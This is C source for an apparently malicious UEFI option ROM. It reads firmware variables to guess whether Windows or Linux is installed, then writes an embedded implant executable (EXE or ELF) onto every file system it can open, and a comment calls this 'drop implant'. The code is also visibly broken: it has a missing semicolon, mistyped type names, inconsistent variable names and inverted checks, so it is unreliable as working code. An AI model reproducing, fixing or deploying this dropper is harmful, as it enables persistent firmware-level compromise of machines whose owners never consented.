#include <Guid/FileInfo.h>
#include <IndustryStandard/Pci.h>
#include <Library/DebugLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiDevicePathLib/UefiDevicePathLib.h>
#include <Library/UefiDriverEntryPoint.h>
#include <Library/UefiLib.h>
#include <Protocol/ComponentName.h>
#include <Protocol/ComponentName2.h>
#include <Protocol/DriverBinding.h>
#include <Protocol/PciIo.h>
#include <Protocol/SimpleFileSystem.h>
#include <Uefi.h>

#include "payload_exe.h"
#include "payload_elf.h"

EFI_GUID SHIM_LOCK_GUID = {0x605dab50, 0xe046, 0x4300, {0xab, 0xb6, 0x3d, 0xd8, 0x10, 0xdd, 0x8b, 0x23 } };
EFI GUID BOOT_GUID = {0x8be4df61, 0x93ca, 0x11d2, { 0xaa, 0x0d, 0x00, 0xe0, 0x98, 0x03, 0x2b, 0x8c} };
unsigned char MokSB[] = "MokSB";
unsigned char BootCurrent[] = "BootCurrent";

enum operating_system {
  Windows = 1,
  Linux = 2,
  Both = 3,
  Unknown = 4,
};

static enum operating_system detect() {
  UINT32 os = 0;
  EFI_STATUS status;
	UINTN size = sizeof(UINT32);
	UINT32 var;
	UINT32 attributes;

  status = RT->GetVariable(MokSB, &SHIM_LOCK_GUID, &attributes,
				     &size, (void *)&var);
	if (EFI_ERROR(status)) {
    os += Linux;
  }

  status = RT->GetVariable(BootCurrent, &BOOT_GUID, &attributes,
				     &size, (void *)&var);
	if (EFI_ERROR(status)) {
    os += Linux;
  }

  unsigned char boot_entry[9]
  snprintf(boot_entry, 8, "Boot%s\n", var);
  status = RT->GetVariable(boot_entry, &BOOT_GUID, &attributes,
				     &size, (void *)&var);
	if (EFI_ERROR(status)) {
    if (strncmp("Windows Boot Manager", var, 20))
    os += Windows;
  }

  return os;
}

void drop_payload() {
  EFI_STATUS status = EFI_SUCCESS;
  UINTN i;
  EFI_HANDLE *handle = NULL;
  UINTN handle_count;

  status = gBS->LocateHandleBuffer(ByProtocol, &gEfiSimpleFileSystemProtocolGuid,
                              NULL, &handle_count, &handle);

  if (!EFI_ERROR(status)) {
#ifdef OPROM_DEBUG
    Print(L"Status %d\n HandleCount %llx", Status, HandleCount);
#endif
    // Loop over all the disks
    EFI_FILE_PROTOCOL *fs = NULL;
    for (i = 0; i < handle_count; i++) {
      EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *simple_fs = NULL;
      EFI_FILE_PROTOCOL *file = NULL;

      status = gBS->HandleProtocol(handle[i],
                                   &gEfiSimpleFileSystemProtocolGuid,
                                   (VOID **)&simple_fs);
      if (EFI_ERROR(status)) {
#ifdef OPROM_DEBUG
        Print(L"FindWritableFs: gBS->HandleProtocol[%d] returned %r\n", i,
              Status);
#endif
        continue;
      }

      // Open the volume
      status = simple_fs->OpenVolume(simple_fs, &fs);
      if (EFI_ERROR(status)) {
#ifdef OPROM_DEBUG
        Print(L"FindWritableFs: SimpleFs->OpenVolume[%d] returned %r\n", i,
              Status);
#endif
        continue;
      }

      // Detect OS and drop implant
      switch (detect()) {
        case Windows:
          status = fs->Open(
              fs, &file,
              payload_exe_attack_path,
              EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
          if (EFI_ERROR(status)) {
#ifdef OPROM_DEBUG
            Print(L"FindWritableFs: Fs->Open[%d] returned %r\n", i, Status);
#endif
            continue;
          }
          UINTN buf = sizeof(payload_exe);
          status = File->Write(File, &buf, payload_exe);
        break;
        case Linux:
          status = fs->Open(
              fs, &file,
              payload_elf_attack_path,
              EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
          if (EFI_ERROR(status)) {
#ifdef OPROM_DEBUG
            Print(L"FindWritableFs: Fs->Open[%d] returned %r\n", i, Status);
#endif
            continue;
          }
          UINTN buf = sizeof(payload_elf);
          status = File->Write(File, &buf, payload_elf);
        break;
        default:
          return 0;
      }
      if (EFI_ERROR(status)) {
#ifdef OPROM_DEBUG
        Print(L"Error with file->write %r\n", Status);
#endif
      }
      File->Close(File);
      status = EFI_SUCCESS;
    }
  }
}